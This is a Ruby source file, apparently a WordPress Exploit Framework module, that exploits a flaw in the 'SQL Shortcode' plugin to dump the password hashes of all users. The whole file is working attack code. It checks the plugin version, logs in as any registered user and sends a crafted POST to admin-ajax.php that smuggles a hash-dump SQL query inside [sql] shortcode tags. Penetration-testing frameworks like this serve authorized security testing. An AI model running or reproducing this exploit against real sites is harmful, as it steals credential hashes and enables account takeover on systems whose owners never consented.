# frozen_string_literal: true

class Wpxf::Auxiliary::SqlShortcodeHashDump < Wpxf::Module
  include Wpxf::WordPress::HashDump

  def initialize
    super

    update_info(
      name: 'SQL Shortcode Authenticated Hash Dump',
      desc: %(
        SQL Shortcode allows registered users of any level to execute
        arbitrary SQL queries against the database.

        This module utilises this design flaw to dump the hashed passwords
        of all users in the database.
      ),
      author: [
        'Paul Dannewitz', # Disclosure
        'rastating'       # WPXF module
      ],
      references: [
        ['WPVDB', '8904']
      ],
      date: 'Sept 02 2017'
    )
  end

  def check
    check_plugin_version_from_readme('sql-shortcode')
  end

  def requires_authentication
    true
  end

  def hashdump_request_method
    :post
  end

  def hashdump_request_body
    {
      'action'    => 'parse-media-shortcode',
      'shortcode' => "[sql]#{hashdump_sql_statement}[/sql]"
    }
  end

  def hashdump_visible_field_index
    0
  end

  def hashdump_number_of_cols
    1
  end

  def vulnerable_url
    wordpress_url_admin_ajax
  end
end
